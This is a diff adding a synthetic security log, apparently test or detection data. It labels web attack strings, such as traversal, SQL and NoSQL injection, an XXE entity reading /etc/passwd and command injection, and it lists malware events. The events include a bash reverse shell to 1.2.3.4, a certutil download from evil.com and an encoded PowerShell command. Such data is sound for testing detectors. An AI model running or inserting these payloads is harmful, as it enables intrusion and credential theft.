@@ -1,0 +1,30 @@
+GET /index.php?page=../../../etc/passwd HTTP/1.1 - Directory traversal attempt
+POST /search.php?query={$where: "javascript:alert(1)"} - NoSQL injection detected
+GET /api.php?url=http://localhost/admin - SSRF attempt
+GET /download?file=../../windows/win.ini - Path traversal
+POST /submit.php?cmd=;cat /etc/passwd - Command injection
+GET /xml.php?data=<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]> - XXE attack
+GET /redirect.php?url=http://evil.com/phishing - Open redirect
+POST /login.php - CSRF token missing, potential attack
+GET /admin.php - WAF bypass attempt using encoding
+POST /upload.php - File upload attempted: shell.php
+GET /api/users - Broken access control - unauthorized access
+2023-12-10 14:12:33 Ransomware activity: files encrypted with extension .locked
+2023-12-10 14:12:35 Crypto mining process detected: xmrig running on high CPU
+2023-12-10 14:12:40 Reverse shell connection: bash -i >& /dev/tcp/1.2.3.4/4444 0>&1
+2023-12-10 14:12:45 Web shell uploaded: /uploads/c99shell.php detected
+2023-12-10 14:12:50 Keylogger activity: keystroke logging process running
+2023-12-10 14:12:55 Botnet communication to C&C server 94.130.11.15
+2023-12-10 14:13:00 Worm propagation detected: mass scanning from 192.168.1.200
+2023-12-10 14:13:05 Trojan downloader executed: malware.exe downloaded and executed
+2023-12-10 14:13:10 Spyware screenshot capture uploaded to external server
+2023-12-10 14:13:15 Malicious PowerShell command: powershell -enc SQBFAFgAIAAkAHcAYwA=
+2023-12-10 14:13:20 Living Off The Land: certutil -urlcache -split -f http://evil.com/file.exe
+2023-12-10 14:13:25 Credential dumping: mimikatz.exe detected in memory
+2023-12-10 14:13:30 Persistence mechanism: malware added to registry run key
+2023-12-10 14:12:33 SQL Injection: SELECT * FROM users WHERE id = ' OR '1'='1
+2023-12-10 14:12:35 NoSQL Injection: db.users.find({$where: "this.username == 'admin'"})
+2023-12-10 14:12:40 Database enumeration: SELECT * FROM information_schema.tables
+2023-12-10 14:12:45 Sensitive data exposure: credit_card table accessed without authorization
+2023-12-10 14:12:50 Database schema dumping: mysqldump executed by unauthorized user
+2023-12-10 14:12:55 MongoDB injection: {"username": {"$ne": null}, "password": {"$ne": null}}
